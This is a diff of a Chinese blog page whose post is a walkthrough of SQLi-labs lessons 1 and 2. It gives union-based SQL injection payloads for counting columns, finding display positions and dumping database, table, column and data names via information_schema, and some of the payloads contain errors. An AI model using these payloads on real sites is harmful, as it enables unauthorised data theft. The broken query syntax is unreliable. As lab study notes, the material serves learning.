@@ -194,7 +194,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"C语言感想.1","path":"2023/10/11/C语言感想-1/"},{"title":"MySQL","path":"2023/10/28/MySQL/"},{"title":"MySQL多行处理函数1-0","path":"2023/10/23/MySQL多行处理函数1-0/"},{"title":"MySQL单行处理函数1.0","path":"2023/10/22/MySQL单行处理函数1-0/"},{"title":"SQLI_lab.less.1andless.2","path":"2023/11/05/SQLI-lab-less-1andless-2/"},{"title":"SQL笔记1.0查询","path":"2023/10/29/SQL笔记1-0查询/"},{"title":"SQL笔记2.0修改","path":"2023/10/10/SQL笔记2-0修改/"},{"title":"Hello World","path":"2023/10/05/hello-world/"},{"title":"mysql数据库及数据表操作1.0","path":"2023/10/17/mysql数据库及数据表操作1-0/"},{"title":"mysql单表处理大总结1.0","path":"2023/10/24/mysql表格处理大总结1-0/"},{"title":"mysql查询细节补录","path":"2023/10/21/mysql查询细节补录/"},{"title":"分组查询1.0","path":"2023/10/24/分组查询补录1-0/"},{"title":"mysql查询细节补录2","path":"2023/10/22/mysql查询细节补录2/"},{"title":"vmware基本操作1.0","path":"2023/10/29/vmware基本操作1-0/"},{"title":"口令破译方式1.0","path":"2023/10/22/破译口令方式1-0/"},{"title":"西电2023webhttp","path":"2023/10/25/西电2023webhttp/"},{"title":"请求头笔记及引用源记录","path":"2023/10/25/请求头笔记及引用源记录/"}]`)
+  const posts = JSON.parse(`[{"title":"C语言感想.1","path":"2023/10/11/C语言感想-1/"},{"title":"MySQL","path":"2023/10/28/MySQL/"},{"title":"MySQL单行处理函数1.0","path":"2023/10/22/MySQL单行处理函数1-0/"},{"title":"MySQL多行处理函数1-0","path":"2023/10/23/MySQL多行处理函数1-0/"},{"title":"SQL笔记1.0查询","path":"2023/10/29/SQL笔记1-0查询/"},{"title":"SQLI_lab.less.1andless.2","path":"2023/11/05/SQLI-lab-less-1andless-2/"},{"title":"Hello World","path":"2023/10/05/hello-world/"},{"title":"SQL笔记2.0修改","path":"2023/10/10/SQL笔记2-0修改/"},{"title":"mysql数据库及数据表操作1.0","path":"2023/10/17/mysql数据库及数据表操作1-0/"},{"title":"mysql查询细节补录2","path":"2023/10/22/mysql查询细节补录2/"},{"title":"mysql单表处理大总结1.0","path":"2023/10/24/mysql表格处理大总结1-0/"},{"title":"分组查询1.0","path":"2023/10/24/分组查询补录1-0/"},{"title":"口令破译方式1.0","path":"2023/10/22/破译口令方式1-0/"},{"title":"西电2023webhttp","path":"2023/10/25/西电2023webhttp/"},{"title":"vmware基本操作1.0","path":"2023/10/29/vmware基本操作1-0/"},{"title":"请求头笔记及引用源记录","path":"2023/10/25/请求头笔记及引用源记录/"},{"title":"mysql查询细节补录","path":"2023/10/21/mysql查询细节补录/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -374,36 +374,35 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      <p>  一. 整值型注入</p>
-<p>1.判断注入点类型</p>
+      <h1 id="一-整值型注入"><a href="#一-整值型注入" class="headerlink" title="一. 整值型注入"></a>一. 整值型注入</h1><p>1.判断注入点类型</p>
 <ol>
-<li>id&#x3D;1      页面回显正常</li>
-<li>id&#x3D;1’’    页面回显正常</li>
+<li><code>id=1</code>      页面回显正常</li>
+<li><code>id=1&#39;&#39;</code>    报错</li>
 </ol>
 <p>由以上可知：该注入点为整值型注入点</p>
 <p>2.确认列数</p>
 <p>采用order by方法：</p>
-<p>?id&#x3D;1 order by 1	页面回显正常</p>
-<p>?id&#x3D;1 order by 2	页面回显正常</p>
-<p>?id&#x3D;1 order by 3	页面回显正常</p>
-<p>?id&#x3D;1 order by 4	页面回显不正常：Unknown column ‘4’ in ‘order clause’</p>
+<p><code>?id=1 order by 1</code>	页面回显正常</p>
+<p><code>?id=1 order by 2</code>	页面回显正常</p>
+<p><code>?id=1 order by 3</code>	页面回显正常</p>
+<p><code>?id=1 order by 4</code>	页面回显不正常：Unknown column ‘4’ in ‘order clause’</p>
 <p>由以上可知：有四列</p>
 <p>3.查询显示位（使用union select）</p>
 <p>不是所有列都能显示，但我们需要显示位，所以2、3两步缺一不可。</p>
-<p>?id&#x3D;-1 union select 1,2,3</p>
+<p><code>?id=-1 union select 1,2,3</code></p>
 <p>当id值不存在时，方有我们想要的回显，所以id&#x3D;-1;</p>
 <p>页面回显</p>
 <p>​			Welcome  Dhakkan<br>​			Your Login name:2<br>​			Your Password:3</p>
 <p>由以上可知：显示位有两个</p>
 <p>4.爆数据</p>
 <p>a. 爆所有数据库名：</p>
-<p>?id&#x3D;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata –+ </p>
+<p><code>?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code> </p>
 <p>b. 爆所有表名：</p>
-<p>?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where schema.schemata&#x3D;’goal-database’ –+</p>
+<p><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where schema.schemata=&#39;goal-database&#39; --+</code></p>
 <p>c.爆所有列名：</p>
-<p>?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’goal-table’ –+</p>
+<p><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;goal-table&#39; --+</code></p>
 <p>d.爆所有数据：</p>
-<p>?id&#x3D;-1 union select 1, group_concat_group(goal-column),3 from goal-database.goal-table –+ </p>
+<p><code>?id=-1 union select 1, group_concat_group(goal-column),3 from goal-database.goal-table --+</code> </p>
 <p>小结：</p>
 <ul>
 <li>这种方法有很好的普遍性</li>
@@ -411,11 +410,10 @@
 <li>注释为   空格–+空格 </li>
 <li>注释不能省略，你无法确定其背后的语句在拼接之后是否语法正确</li>
 </ul>
-<p>二. 字符串型注入</p>
-<p>1.判断注入点类型</p>
+<h1 id="二-字符串型注入"><a href="#二-字符串型注入" class="headerlink" title="二. 字符串型注入"></a>二. 字符串型注入</h1><p>1.判断注入点类型</p>
 <ol>
-<li>id&#x3D;1	页面回显正常</li>
-<li>id&#x3D;1’’       页面回显正常</li>
+<li><code>id=1</code>	页面回显正常</li>
+<li><code>id=1&#39;&#39;</code>       页面回显正常</li>
 </ol>
 <p>由以上可知：该注入点为字符串型注入点</p>
 <p>2之后一切类似，但注意id&#x3D;1’或id&#x3D;-1’，这里是需要补一个单引号的，至于注释，这两种方法都要，别嫌麻烦</p>
@@ -440,7 +438,7 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E6%95%B4%E5%80%BC%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">一. 整值型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">二. 字符串型注入</span></a></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
